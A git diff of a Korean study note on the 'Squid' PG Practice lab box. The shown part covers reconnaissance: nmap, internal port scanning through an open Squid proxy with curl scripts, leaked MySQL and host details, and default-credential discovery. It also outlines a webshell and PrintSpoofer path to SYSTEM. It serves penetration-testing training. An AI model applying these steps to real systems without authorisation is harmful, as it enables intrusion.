@@ -18,12 +18,12 @@ status: solved
 manual_tags: true
 tech_count: 4
 ---
-> [!info] PG Practice — Pentester Foundations #6 · **첫 Windows 박스**
+> [!info] PG Practice — Pentester Foundations #6 · 첫 Windows 박스
 > **타겟** 192.168.248.189 · **OS** Windows Server 2019 Standard (build 17763, 호스트명 `SQUID`) · **난이도** Fundamental · **플래그 2개**
-> **경로 요약** 3128 Squid **오픈 프록시**로 내부 포트 열거 → 8080 phpMyAdmin(root 무비번) → `INTO DUMPFILE` 웹셸 → `LOCAL SERVICE` → **FullPowers**로 SeImpersonate 복원 → **PrintSpoofer** → SYSTEM
+> **경로 요약** 3128 Squid 오픈 프록시로 내부 포트 열거 → 8080 phpMyAdmin(root 무비번) → `INTO DUMPFILE` 웹셸 → `LOCAL SERVICE` → FullPowers로 SeImpersonate 복원 → PrintSpoofer → SYSTEM
 
 > [!warning] 이 노트를 읽는 규약 — 관측 출력과 재구성을 구분하라
-> 이 노트의 터미널 출력은 **두 종류**가 섞여 있다. Kali 산출물(`~/PG/Squid/`)로 **대조·실증된 구간**과, 대조할 원본이 없어 **사후 재구성한 구간**이다. 이 노트는 개작 커밋에서 신규 추가돼 git baseline이 없으므로 실증은 Kali 산출물이 남은 구간에 한정된다.
+> 이 노트의 터미널 출력은 **두 종류**가 섞여 있다. Kali 산출물(`~/PG/Squid/`)로 대조·실증된 구간과, 대조할 원본이 없어 사후 재구성한 구간이다. 이 노트는 개작 커밋에서 신규 추가돼 git baseline이 없으므로 실증은 Kali 산출물이 남은 구간에 한정된다.
 > - **실증됨**: §1-1 nmap(`nmap.log`) · §1-2·§2-2 프록시 포트 스캔(`proxyscan.txt`·`pscan.sh`·`psweep.sh`) · §1-6 gobuster(`gobuster8080.txt`) · §3 hex 웹셸(`sh.php`와 diff 무차이) · §3 래퍼(`web.sh`) · 도구 목록
 > - **대조 불가 (재구성 가능성 있음)**: §1-2 MySQL 배너 덤프 · §1-4 phpSysInfo XML · §1-5 `testmysql.php` 출력 · §4-3/4-4 FullPowers·PrintSpoofer 실행 출력 · §5 플래그 세션
 >
@@ -31,27 +31,24 @@ tech_count: 4
 
 ## 0. 이 박스에서 배우는 것
 
-- **오픈 프록시는 공격면이 아니라 통로다** — 외부 nmap이 보여주는 것은 이 박스의 절반도 안 된다. 프록시가 방화벽 뒤의 포트를 대신 열어준다
-- **프록시 응답 코드로 내부 포트를 판별하는 법** — `503`/`403`/그 외의 의미를 손으로 구분한다. 도구가 오판할 때 이 기준만이 구해준다
-- **MySQL 파일 쓰기 원시(primitive)로 웹셸 심기** — `@@secure_file_priv` 확인 → `INTO DUMPFILE` → hex 리터럴
-- **Windows 토큰·특권 모델** — `SeImpersonatePrivilege`가 왜 SYSTEM으로 가는 열쇠이고, Potato 계열이 **명명 파이프 임퍼소네이션**으로 어떻게 동작하는가
-- **`LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것** — FullPowers로 되찾는다. **이 개념을 모르면 PrintSpoofer 단계까지 도달조차 못 한다**
-- **Windows 전용 실전 요령** — `certutil` 다운로드(성공 배너를 믿지 말고 쓰기 가능한 절대경로로), `powershell -enc`, TTY 업그레이드가 해당 없다는 사실
+- 오픈 프록시는 공격면이 아니라 통로다 — 외부 nmap이 보여주는 것은 이 박스의 절반도 안 된다. 프록시가 방화벽 뒤의 포트를 대신 열어준다
+- 프록시 응답 코드로 내부 포트를 판별하는 법 — `503`/`403`/그 외의 의미를 손으로 구분한다. 도구가 오판할 때 이 기준만이 구해준다
+- MySQL 파일 쓰기 원시(primitive)로 웹셸 심기 — `@@secure_file_priv` 확인 → `INTO DUMPFILE` → hex 리터럴
+- Windows 토큰·특권 모델 — `SeImpersonatePrivilege`가 왜 SYSTEM으로 가는 열쇠이고, Potato 계열이 명명 파이프 임퍼소네이션으로 어떻게 동작하는가
+- `LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것 — FullPowers로 되찾는다. 이 개념을 모르면 PrintSpoofer 단계까지 도달조차 못 한다
+- Windows 전용 실전 요령 — `certutil` 다운로드(성공 배너를 믿지 말고 쓰기 가능한 절대경로로), `powershell -enc`, TTY 업그레이드가 해당 없다는 사실
 
-> [!tip] 시험 출제 가능성
-> **부분적으로 높다.** 셋으로 나눠서 보자.
->
-> | 요소 | 시험 출제 가능성 | 이유 |
-> |---|---|---|
-> | **오픈 프록시 피벗** | 낮음~중간 | Squid 자체는 흔하지 않지만, **"외부에서 보이는 포트가 전부가 아니다"** 라는 사고방식은 SSH 포트포워딩·chisel·프록시체인 전 영역에 그대로 적용된다. 시험의 피벗 구간이 정확히 이 사고를 요구한다 |
-> | **DB 자격증명 → 웹루트 파일 쓰기 → 웹셸** | **매우 높음** | phpMyAdmin/adminer 무비번은 시험 단골이다. `INTO OUTFILE`/`INTO DUMPFILE`은 [[Hawat]]에서도 그대로 나왔다 |
-> | **`SeImpersonatePrivilege` → Potato → SYSTEM** | **매우 높음** | Windows 서비스 계정(`LOCAL SERVICE`·`NETWORK SERVICE`·`IIS APPPOOL\*`·`mssql`)으로 셸을 잡는 순간 이게 정석 경로다. **Windows 박스를 만나면 `whoami /priv`가 첫 명령**이다 |
->
-> 변형은 이런 모습이다 — MySQL 대신 MSSQL(`xp_cmdshell`), phpMyAdmin 대신 Tomcat manager, Squid 대신 내부망 점프호스트. **원리는 동일하다.**
+시험 출제 가능성은 부분적으로 높다. 셋으로 나눠서 본다.
 
-> [!abstract] 이 박스가 특별한 이유
-> Pentester Foundations 컬렉션에서 **유일한 Windows 박스**다. 앞의 [[Crane]]·[[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]이 전부 Linux였다.
-> 그래서 리눅스 반사신경(`sudo -l`, `find / -perm -4000`, `python3 -c 'import pty'`)이 **전부 무용지물**이 되는 첫 지점이기도 하다. 이 노트의 절반은 그 대체 반사신경을 만드는 데 쓴다.
+| 요소 | 시험 출제 가능성 | 이유 |
+|---|---|---|
+| 오픈 프록시 피벗 | 낮음~중간 | Squid 자체는 흔하지 않지만, "외부에서 보이는 포트가 전부가 아니다"라는 사고방식은 SSH 포트포워딩·chisel·프록시체인 전 영역에 그대로 적용된다. 시험의 피벗 구간이 정확히 이 사고를 요구한다 |
+| DB 자격증명 → 웹루트 파일 쓰기 → 웹셸 | 매우 높음 | phpMyAdmin/adminer 무비번은 시험 단골이다. `INTO OUTFILE`/`INTO DUMPFILE`은 [[Hawat]]에서도 그대로 나왔다 |
+| `SeImpersonatePrivilege` → Potato → SYSTEM | 매우 높음 | Windows 서비스 계정(`LOCAL SERVICE`·`NETWORK SERVICE`·`IIS APPPOOL\*`·`mssql`)으로 셸을 잡는 순간 이게 정석 경로다. Windows 박스를 만나면 `whoami /priv`가 첫 명령이다 |
+
+변형은 이런 모습이다 — MySQL 대신 MSSQL(`xp_cmdshell`), phpMyAdmin 대신 Tomcat manager, Squid 대신 내부망 점프호스트. 원리는 동일하다.
+
+Pentester Foundations 컬렉션에서 유일한 Windows 박스다. 앞의 [[Crane]]·[[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]이 전부 Linux였다. 그래서 리눅스 반사신경(`sudo -l`, `find / -perm -4000`, `python3 -c 'import pty'`)이 전부 무용지물이 되는 첫 지점이기도 하다. 이 노트의 절반은 그 대체 반사신경을 만드는 데 쓴다.
 
 ---
 
@@ -84,37 +81,36 @@ Running (JUST GUESSING): Microsoft Windows 2019 (92%)
 
 | 플래그 | 역할 | 빼면 어떻게 되는가 |
 |---|---|---|
-| `-p-` | 65535 포트 전수 | 기본 1000포트 스캔이면 3128은 잡히지만 **고번호 RPC 포트(49666/49667)를 놓친다**. 다른 박스에서는 이게 웹 포트일 수 있다 |
-| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `squid/4.14`라는 **정확한 버전**과 `http-server-header`가 안 나온다. 여기서는 이 한 줄이 "오픈 프록시일 수 있다"는 판단의 출발점이다 |
-| `-Pn` | ping 사전 탐지 생략 | Windows 방화벽은 기본적으로 ICMP를 막는다. **`-Pn`을 빼면 "호스트 다운"으로 오판하고 스캔 자체를 안 한다.** Windows 타겟에서 가장 흔한 초보 실수 |
-| `-A` | OS 추측 + traceroute + 스크립트 | `Microsoft Windows 2019 (92%)`가 안 나온다. 뒤에서 phpSysInfo가 준 `Windows Server 2019 Standard`와 **교차 검증**하는 데 쓴다 |
-| `--min-rate 5000` | 초당 최소 패킷 | 65535 포트 전수가 수십 분 → 1~2분. **24시간 시험에서 이 한 줄이 시간을 만든다** |
+| `-p-` | 65535 포트 전수 | 기본 1000포트 스캔이면 3128은 잡히지만 고번호 RPC 포트(49666/49667)를 놓친다. 다른 박스에서는 이게 웹 포트일 수 있다 |
+| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `squid/4.14`라는 정확한 버전과 `http-server-header`가 안 나온다. 여기서는 이 한 줄이 "오픈 프록시일 수 있다"는 판단의 출발점이다 |
+| `-Pn` | ping 사전 탐지 생략 | Windows 방화벽은 기본적으로 ICMP를 막는다. `-Pn`을 빼면 "호스트 다운"으로 오판하고 스캔 자체를 안 한다. Windows 타겟에서 가장 흔한 초보 실수 |
+| `-A` | OS 추측 + traceroute + 스크립트 | `Microsoft Windows 2019 (92%)`가 안 나온다. 뒤에서 phpSysInfo가 준 `Windows Server 2019 Standard`와 교차 검증하는 데 쓴다 |
+| `--min-rate 5000` | 초당 최소 패킷 | 65535 포트 전수가 수십 분 → 1~2분. 24시간 시험에서 이 한 줄이 시간을 만든다 |
 | `-oN nmap.log` | 사람이 읽는 포맷으로 저장 | 재실행 없이 다시 볼 수 있다. 시험에서는 리포트 증거로도 쓴다 |
 
-**웹 포트가 3128 하나뿐이다.** 80도 443도 없다. 나머지 65529개는 `filtered`(무응답) — 방화벽이 막고 있다.
+웹 포트가 3128 하나뿐이다. 80도 443도 없다. 나머지 65529개는 `filtered`(무응답) — 방화벽이 막고 있다.
 
-> [!note] `filtered` · `closed` · `open`의 차이를 정확히 읽어라
-> - `open` — SYN/ACK가 왔다. 서비스가 있다
-> - `closed` — RST가 왔다. **호스트는 살아 있고 그 포트에 서비스가 없다** (방화벽이 없다는 뜻이기도 하다 → [[Hawat]]에서 `443/tcp closed`가 아웃바운드 힌트였다)
-> - `filtered` — **아무 응답도 없다.** 방화벽이 패킷을 버렸다. **"서비스가 없다"가 아니라 "볼 수 없다"** 이다
->
-> 여기서 65529개가 전부 `filtered`라는 것은 **"뒤에 뭔가 잔뜩 있는데 방화벽이 가리고 있다"** 는 강한 신호다. 아무것도 없는 호스트는 이렇게 생기지 않는다.
+`filtered`·`closed`·`open`의 차이를 정확히 읽어야 한다.
 
-> [!warning] 여기서 "공격면이 없다"고 결론내면 박스가 끝난다
-> 보이는 것은 SMB/RPC와 **프록시** 하나. 그런데 **프록시는 그 자체가 공격면이 아니라 통로**다.
-> Squid가 인증 없이 열려 있으면(오픈 프록시) **방화벽 뒤의 포트를 프록시가 대신 열어준다.** 외부 스캔 결과는 이 박스의 절반도 보여주지 않는다.
+- `open` — SYN/ACK가 왔다. 서비스가 있다
+- `closed` — RST가 왔다. 호스트는 살아 있고 그 포트에 서비스가 없다(방화벽이 없다는 뜻이기도 하다 → [[Hawat]]에서 `443/tcp closed`가 아웃바운드 힌트였다)
+- `filtered` — 아무 응답도 없다. 방화벽이 패킷을 버렸다. "서비스가 없다"가 아니라 **"볼 수 없다"**이다
+
+여기서 65529개가 전부 `filtered`라는 것은 "뒤에 뭔가 잔뜩 있는데 방화벽이 가리고 있다"는 강한 신호다. 아무것도 없는 호스트는 이렇게 생기지 않는다.
+
+보이는 것은 SMB/RPC와 프록시 하나. 여기서 "공격면이 없다"고 결론내면 박스가 끝난다. 프록시는 그 자체가 공격면이 아니라 **통로**다. Squid가 인증 없이 열려 있으면(오픈 프록시) 방화벽 뒤의 포트를 프록시가 대신 열어준다. 외부 스캔 결과는 이 박스의 절반도 보여주지 않는다.
 
 ### 1-2. 프록시 경유 내부 포트 열거 — 이 박스의 전부
 
-Squid는 `http://127.0.0.1:<포트>/` 요청을 그대로 중계한다. **응답 코드로 내부 포트의 개폐를 판별**할 수 있다:
+Squid는 `http://127.0.0.1:<포트>/` 요청을 그대로 중계한다. 응답 코드로 내부 포트의 개폐를 판별할 수 있다.
 
 | 응답 | 의미 |
 |---|---|
-| `503` + `X-Squid-Error: ERR_CONNECT_FAIL` | 내부 포트 **연결 실패** — 닫힘(RST) **또는 필터링**(§2-2 참조). 루프백 대상에서는 실질적으로 닫힘 |
-| `403` + `ERR_ACCESS_DENIED` | Squid **Safe_ports ACL이 차단** — 개폐 판별 불가 |
-| 그 외 (200/400/404/405…) | 내부 포트 **열림** |
+| `503` + `X-Squid-Error: ERR_CONNECT_FAIL` | 내부 포트 연결 실패 — 닫힘(RST) 또는 필터링(§2-2 참조). 루프백 대상에서는 실질적으로 닫힘 |
+| `403` + `ERR_ACCESS_DENIED` | Squid Safe_ports ACL이 차단 — 개폐 판별 불가 |
+| 그 외 (200/400/404/405…) | 내부 포트 열림 |
 
-실제로 쓴 것은 인자로 포트 하나를 받아 **503과 000을 걸러내고** 열린 포트만 출력하는 스크립트 두 개다. 전 포트를 이 스크립트로 훑어 `proxyscan.txt`에 모았다:
+실제로 쓴 것은 인자로 포트 하나를 받아 503과 000을 걸러내고 열린 포트만 출력하는 스크립트 두 개다. 전 포트를 이 스크립트로 훑어 `proxyscan.txt`에 모았다.
 
 ```bash
 ┌──(kali㉿kali)-[~/PG/Squid]
@@ -133,7 +129,7 @@ C=${R%%|*}
 if [ "$C" != "503" ] && [ "$C" != "000" ]; then echo "OPEN $P -> $R"; fi
 ```
 
-전 포트를 훑어 **503·000(닫힘·필터링)을 걸러내고 남은 것**만 모으면 (`proxyscan.txt`의 비-403 라인 전체):
+전 포트를 훑어 503·000(닫힘·필터링)을 걸러내고 남은 것만 모으면 (`proxyscan.txt`의 비-403 라인 전체):
 
 ```
 PORT 3128  -> HTTP 400     ← Squid 자신 (ERR_INVALID_URL)
@@ -143,41 +139,37 @@ PORT 8080  -> HTTP 200     ← 열림 (WampServer)
 PORT 47001 -> HTTP 404     ← 열림 (WinRM HTTP)
 ```
 
-> [!note] 이 스크립트로는 `9999`·`3307`이 출력에 **나오지 않는다** — 필터가 걸러낸 것을 복원해 보여준 셈
-> 두 스크립트 모두 `503`을 출력에서 제외하므로, MariaDB 3307과 임의 고포트 9999(둘 다 미기동=503)는 `proxyscan.txt`에 **아예 부재**하다. "닫힘"이라는 판정 자체는 옳지만, 그 판정은 **결과가 안 나온 것**(=필터됨)으로부터 역으로 읽은 것이다. 판별 기준(503=연결 실패)을 설명하려고 두 포트를 예로 복원해 적었을 뿐, 실제 스캔 출력에는 없었다.
+이 스크립트로는 `9999`·`3307`이 출력에 나오지 않는다 — 필터가 걸러낸 것을 복원해 보여준 셈이다. 두 스크립트 모두 `503`을 출력에서 제외하므로, MariaDB 3307과 임의 고포트 9999(둘 다 미기동=503)는 `proxyscan.txt`에 아예 부재하다. "닫힘"이라는 판정 자체는 옳지만, 그 판정은 결과가 안 나온 것(=필터됨)으로부터 역으로 읽은 것이다. 판별 기준(503=연결 실패)을 설명하려고 두 포트를 예로 복원해 적었을 뿐, 실제 스캔 출력에는 없었다.
 
 **플래그 해설**
 
 | 플래그 | 역할 | 빼면 어떻게 되는가 |
 |---|---|---|
-| `-x http://TARGET:3128` | curl에게 **이 요청을 프록시로 보내라**고 지시. URL(`http://127.0.0.1:8080/`)은 **프록시가 대신 접속할 목적지**가 된다 | 없으면 칼리 자신의 127.0.0.1에 접속한다. **이 한 글자가 이 박스의 전부다** |
+| `-x http://TARGET:3128` | curl에게 이 요청을 프록시로 보내라고 지시. URL(`http://127.0.0.1:8080/`)은 프록시가 대신 접속할 목적지가 된다 | 없으면 칼리 자신의 127.0.0.1에 접속한다. **이 한 글자가 이 박스의 전부다** |
 | `-s` | 진행률 표시 억제 | `-w` 출력에 진행률이 섞여 파싱이 깨진다 |
-| `-o /dev/null` | 본문 버림 | 본문이 터미널을 덮는다. 여기서 필요한 것은 **코드뿐** |
+| `-o /dev/null` | 본문 버림 | 본문이 터미널을 덮는다. 여기서 필요한 것은 코드뿐 |
 | `-m 8` | 8초 타임아웃 | **필수다.** 필터링된 포트는 응답이 영영 안 오고, 루프가 통째로 멈춘다 |
 | `-w '%{http_code}'` | 상태 코드만 출력 | 판별 기준 자체가 사라진다 |
 
-> [!danger] 왜 `127.0.0.1`인가 — 프록시 열거의 핵심
-> 프록시에게 `http://192.168.248.189:3306/`(타겟의 외부 IP)을 요청해도 되지만, **`127.0.0.1`을 쓰면 타겟 자신의 루프백에서 출발**한다.
-> 서비스가 `0.0.0.0`이 아니라 **루프백에만 바인드**돼 있으면(MySQL·WinRM 기본 구성에서 흔하다) 외부 IP로는 안 붙고 `127.0.0.1`로만 붙는다.
-> **프록시를 만나면 항상 `127.0.0.1`로 먼저 쏜다.** `localhost`도 함께 시도한다 — hosts 파일 구성에 따라 결과가 다를 수 있다.
+프록시에게 `http://192.168.248.189:3306/`(타겟의 외부 IP)을 요청해도 되지만, `127.0.0.1`을 쓰면 타겟 자신의 루프백에서 출발한다. 서비스가 `0.0.0.0`이 아니라 루프백에만 바인드돼 있으면(MySQL·WinRM 기본 구성에서 흔하다) 외부 IP로는 안 붙고 `127.0.0.1`로만 붙는다. 프록시를 만나면 항상 `127.0.0.1`로 먼저 쏜다. `localhost`도 함께 시도한다 — hosts 파일 구성에 따라 결과가 다를 수 있다.
 
 전 포트를 병렬로 돌려 얻은 결과:
 
 | 내부 포트 | 서비스 | 외부 노출 |
 |---|---|---|
 | **3128** | Squid 자신 (`400 ERR_INVALID_URL`) | ✅ |
-| **3306** | **MySQL 5.7.31** | ❌ |
-| **5985** | **WinRM** (`Microsoft-HTTPAPI/2.0`) | ❌ |
-| **8080** | **Apache 2.4.46 (Win64) / WampServer** | ❌ |
+| **3306** | MySQL 5.7.31 | ❌ |
+| **5985** | WinRM (`Microsoft-HTTPAPI/2.0`) | ❌ |
+| **8080** | Apache 2.4.46 (Win64) / WampServer | ❌ |
 | **47001** | WinRM HTTP listener | ❌ |
 
-> [!tip] 자동화 도구
-> `spose.py` (https://github.com/aancw/spose) 가 이 작업을 해준다:
-> ```bash
-> python3 spose.py --proxy http://192.168.248.189:3128 --target 192.168.248.189
-> ```
-> 다만 **판별 기준을 직접 이해하고 있어야** 도구가 놓치거나 오판할 때 수동으로 확인할 수 있다. 위의 `503 vs 200` 대비가 그 기준이다.
-> **이 박스에서 실제로 쓴 것은 위의 `pscan.sh`/`psweep.sh`**다 — `spose` 없이도 전 포트를 훑을 수 있다.
+`spose.py` (https://github.com/aancw/spose) 가 이 작업을 대신해준다:
+
+```bash
+python3 spose.py --proxy http://192.168.248.189:3128 --target 192.168.248.189
+```
+
+다만 판별 기준을 직접 이해하고 있어야 도구가 놓치거나 오판할 때 수동으로 확인할 수 있다. 위의 `503 vs 200` 대비가 그 기준이다. 이 박스에서 실제로 쓴 것은 위의 `pscan.sh`/`psweep.sh`다 — `spose` 없이도 전 포트를 훑을 수 있다.
 
 MySQL 배너도 프록시를 통해 그대로 샌다 (HTTP/0.9로 감싸져 나온다):
 
@@ -189,17 +181,9 @@ J^@^@^@
 5.7.31^@^M^@^@^@Q!^_^KH7^SZ ... mysql_native_password ... Got packets out of order
 ```
 
-**MySQL 5.7.31**, 인증 플러그인 `mysql_native_password`.
+MySQL 5.7.31, 인증 플러그인 `mysql_native_password`. MySQL은 접속 즉시 서버가 먼저 핸드셰이크 패킷(버전 문자열 포함)을 보낸다. 우리가 보낸 `GET / HTTP/1.1`은 MySQL 프로토콜로는 쓰레기라 `Got packets out of order` 에러로 끝나지만, 그 전에 이미 배너를 받았다. Squid는 응답 첫 줄이 `HTTP/x.x`가 아니면 HTTP/0.9 본문으로 간주해 그대로 전달한다(`X-Transformed-From: HTTP/0.9`). 그래서 HTTP 프록시만으로 비-HTTP 서비스의 배너를 딸 수 있다 — SMTP·FTP·Redis 배너도 같은 방식으로 샌다.
 
-> [!note] HTTP가 아닌 서비스에 HTTP를 던지면 왜 배너가 나오는가
-> MySQL은 접속 즉시 **서버가 먼저** 핸드셰이크 패킷(버전 문자열 포함)을 보낸다. 우리가 보낸 `GET / HTTP/1.1`은 MySQL 프로토콜로는 쓰레기라 `Got packets out of order` 에러로 끝나지만, **그 전에 이미 배너를 받았다.**
-> Squid는 응답 첫 줄이 `HTTP/x.x`가 아니면 **HTTP/0.9 본문**으로 간주해 그대로 전달한다(`X-Transformed-From: HTTP/0.9`). 그래서 **HTTP 프록시만으로 비-HTTP 서비스의 배너를 딸 수 있다.**
-> 프록시 피벗에서 이 트릭은 매우 자주 쓰인다 — SMTP·FTP·Redis 배너도 같은 방식으로 샌다.
-
-> [!warning] 프록시 열거의 한계 — 정직하게 기록할 것
-> Squid의 `Safe_ports` ACL(21,70,80,210,280,443,488,591,777 및 1025-65535) **밖의 1024 이하 포트는 전부 403**이라 개폐를 판별할 수 없다(허용 하한이 1025이므로 차단 경계는 "1025 미만"=1024 이하다). 실측: `proxyscan.txt`에서 403 응답 포트의 **최댓값이 정확히 1024**, 403 총 개수는 **1015 = (1..1024) 1024개 − Safe_ports 9개**로 산수까지 맞는다.
-> `CONNECT`는 **443 외 전부 차단**됐고(`http_access deny CONNECT !SSL_ports` + `SSL_ports=443`), 443에는 서비스가 없어 실질적으로 범용 터널이 불가능했다. cache manager(`/squid-internal-mgr/info`)도 403이라 설정 덤프도 불가능하다.
-> **"스캔했는데 안 나왔다"와 "스캔할 수 없었다"는 다르다.** 보고서에는 후자를 명시해야 한다.
+프록시 열거의 한계는 정직하게 기록해 둔다. Squid의 `Safe_ports` ACL(21,70,80,210,280,443,488,591,777 및 1025-65535) 밖의 1024 이하 포트는 전부 403이라 개폐를 판별할 수 없다(허용 하한이 1025이므로 차단 경계는 "1025 미만"=1024 이하다). 실측: `proxyscan.txt`에서 403 응답 포트의 최댓값이 정확히 1024, 403 총 개수는 1015 = (1..1024) 1024개 − Safe_ports 9개로 산수까지 맞는다. `CONNECT`는 443 외 전부 차단됐고(`http_access deny CONNECT !SSL_ports` + `SSL_ports=443`), 443에는 서비스가 없어 실질적으로 범용 터널이 불가능했다. cache manager(`/squid-internal-mgr/info`)도 403이라 설정 덤프도 불가능하다. **"스캔했는데 안 나왔다"와 "스캔할 수 없었다"는 다르다.** 보고서에는 후자를 명시해야 한다.
 
 ### 1-3. 내부 서비스 식별 (전부 프록시 경유)
 
@@ -210,9 +194,9 @@ Server: Apache/2.4.46 (Win64) PHP/7.3.21
 X-Powered-By: PHP/7.3.21
 ```
 
-`-I`는 **HEAD 요청**이다. 본문을 받지 않으므로 프록시 경유의 느린 왕복에서 특히 유리하다.
+`-I`는 HEAD 요청이다. 본문을 받지 않으므로 프록시 경유의 느린 왕복에서 특히 유리하다.
 
-WampServer 홈페이지가 **구성 전체를 렌더한다**:
+WampServer 홈페이지가 구성 전체를 렌더한다:
 
 ```
 Version 3.2.3 - 64bit
@@ -222,7 +206,7 @@ MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307
 Your Aliases: adminer  phpmyadmin  phpsysinfo
 ```
 
-MariaDB 3307은 정의만 돼 있고 실제로는 `503`(미기동)이다 — **설정에 적혀 있다고 떠 있는 게 아니다.**
+MariaDB 3307은 정의만 돼 있고 실제로는 `503`(미기동)이다 — 설정에 적혀 있다고 떠 있는 게 아니다.
 
 버전 확정 (런타임 렌더 값 우선):
 
@@ -238,13 +222,11 @@ version=4.7.7
 
 | 앱 | 버전 | 교차 근거 |
 |---|---|---|
-| **phpMyAdmin** | **5.0.2** | 인라인 JS `PMA_VERSION` + 자산 캐시버스터 `?v=5.0.2` (런타임) / `doc/html/index.html` `<title>` / `RELEASE-DATE-5.0.2` |
-| **Adminer** | **4.7.7** | CSS·JS 두 자산의 `version=` 파라미터 (런타임) |
+| phpMyAdmin | 5.0.2 | 인라인 JS `PMA_VERSION` + 자산 캐시버스터 `?v=5.0.2` (런타임) / `doc/html/index.html` `<title>` / `RELEASE-DATE-5.0.2` |
+| Adminer | 4.7.7 | CSS·JS 두 자산의 `version=` 파라미터 (런타임) |
 | phpSysInfo | 3.3.2 | `<Generation version="3.3.2">` |
 
-> [!tip] 버전 판정은 독립 근거 2개 (누적 패턴: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]])
-> `RELEASE-DATE-*`·`CHANGELOG` 같은 **정적 파일은 업그레이드 시 남아 있을 수 있다.** 실제로 도는 버전은 **런타임이 렌더한 값**(`PMA_VERSION`, 자산 캐시버스터)이 우선이다.
-> 둘이 어긋나면 런타임을 믿고, 어긋났다는 사실 자체를 기록한다.
+버전 판정은 독립 근거 2개로 한다(누적 패턴: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]]). `RELEASE-DATE-*`·`CHANGELOG` 같은 정적 파일은 업그레이드 시 남아 있을 수 있다. 실제로 도는 버전은 런타임이 렌더한 값(`PMA_VERSION`, 자산 캐시버스터)이 우선이다. 둘이 어긋나면 런타임을 믿고, 어긋났다는 사실 자체를 기록한다.
 
 ### 1-4. phpSysInfo — 인증 없이 호스트 정보 대량 유출
 
@@ -258,25 +240,22 @@ version=4.7.7
 <Mount FSType="NTFS" Name="Local Disk" Total="31566327808" MountPoint="C:"/>
 ```
 
-호스트명 `SQUID`, **Windows Server 2019 Standard build 17763**, MAC, VMware 게스트, C: 30GB NTFS. nmap의 OS 추측(92% Windows Server 2019)과 교차 일치한다.
+호스트명 `SQUID`, Windows Server 2019 Standard build 17763, MAC, VMware 게스트, C: 30GB NTFS. nmap의 OS 추측(92% Windows Server 2019)과 교차 일치한다.
 
-> [!note] build 17763이 왜 중요한가 — 권한상승 경로를 여기서 이미 좁힌다
-> Windows 10 1809 / Server 2019 = **build 17763**. 이 빌드부터 **JuicyPotato가 죽었다** — 1809부터 OXID 리졸버를 135 외 포트로 질의할 수 없게 되어 JuicyPotato의 로컬 포트 리디렉트(`-l <port>`)가 막혔다. (그래서 RoguePotato가 **아웃바운드 135**를 요구하게 됐다.)
-> 즉 이 숫자를 본 순간 "SeImpersonate를 잡으면 **PrintSpoofer 또는 RoguePotato**를 쓴다"가 확정된다. 2장 2-6에서 자세히 다룬다.
-> **버전 문자열은 익스플로잇 검색용이 아니라 경로 선택용이다.**
+build 17763은 권한상승 경로를 여기서 이미 좁혀준다. Windows 10 1809 / Server 2019 = build 17763. 이 빌드부터 JuicyPotato가 죽었다 — 1809부터 OXID 리졸버를 135 외 포트로 질의할 수 없게 되어 JuicyPotato의 로컬 포트 리디렉트(`-l <port>`)가 막혔다(그래서 RoguePotato가 아웃바운드 135를 요구하게 됐다). 즉 이 숫자를 본 순간 "SeImpersonate를 잡으면 PrintSpoofer 또는 RoguePotato를 쓴다"가 확정된다. 2장 2-6에서 자세히 다룬다. 버전 문자열은 익스플로잇 검색용이 아니라 경로 선택용이다.
 
-`?phpinfo=1` 은 **설치 경로**를 준다:
+`?phpinfo=1` 은 설치 경로를 준다:
 
 ```
 System   Windows NT SQUID 10.0 build 17763 AMD64
 Loaded Configuration File   C:\wamp\bin\apache\apache2.4.46\bin\php.ini
 ```
 
-→ **wamp 경로 `C:\wamp\`**, 웹루트는 `C:\wamp\www\`. `INTO DUMPFILE`로 웹셸을 떨어뜨릴 때 이 경로가 필요하다.
+→ wamp 경로 `C:\wamp\`, 웹루트는 `C:\wamp\www\`. `INTO DUMPFILE`로 웹셸을 떨어뜨릴 때 이 경로가 필요하다.
 
 ### 1-5. 결정적 단서 — `/testmysql.php`
 
-wamp 기본 스크립트가 **인증 없이 MySQL 접속에 성공**하고 있다:
+wamp 기본 스크립트가 인증 없이 MySQL 접속에 성공하고 있다:
 
 ```
 Connection OK 127.0.0.1 via TCP/IP
@@ -284,15 +263,13 @@ Server 5.7.31
 Initial charset: latin1
 ```
 
-wamp 기본값은 **`root` / 빈 패스워드**다. 이 한 줄이 phpMyAdmin 로그인 자격증명을 사실상 확정해준다.
+wamp 기본값은 `root` / 빈 패스워드다. 이 한 줄이 phpMyAdmin 로그인 자격증명을 사실상 확정해준다.
 
-> [!tip] 남이 만들어둔 진단 스크립트를 찾아라
-> `testmysql.php`·`info.php`·`phpinfo.php`·`test.php`·`db_test.php` 같은 **개발자 편의 스크립트**는 인증 없이 내부 연결 정보를 확인해주는 경우가 많다.
-> 여기서는 "DB에 무비번으로 붙는다"는 사실을 **로그인 시도 한 번 없이** 알아냈다.
+`testmysql.php`·`info.php`·`phpinfo.php`·`test.php`·`db_test.php` 같은 개발자 편의 스크립트는 인증 없이 내부 연결 정보를 확인해주는 경우가 많다. 여기서는 "DB에 무비번으로 붙는다"는 사실을 로그인 시도 한 번 없이 알아냈다.
 
 ### 1-6. 디렉터리 열거
 
-외부 웹 포트가 없어서 **8080을 프록시 경유로** 열거했다. 프록시를 거치면 매우 느려서 대규모 워드리스트는 부적합하다(300초 제한에 걸려 미완주 — **부분 커버리지**).
+외부 웹 포트가 없어서 8080을 프록시 경유로 열거했다. 프록시를 거치면 매우 느려서 대규모 워드리스트는 부적합하다(300초 제한에 걸려 미완주 — 부분 커버리지).
 
 ```bash
 ┌──(kali㉿kali)-[~/PG/Squid]
@@ -310,27 +287,23 @@ wamp 기본값은 **`root` / 빈 패스워드**다. 이 한 줄이 phpMyAdmin �
 
 | 플래그 | 역할 |
 |---|---|
-| `-u http://127.0.0.1:8080/` | **타겟은 루프백**이다. 프록시가 대신 접속하므로 우리 쪽 127.0.0.1이 아니다 |
+| `-u http://127.0.0.1:8080/` | 타겟은 루프백이다. 프록시가 대신 접속하므로 우리 쪽 127.0.0.1이 아니다 |
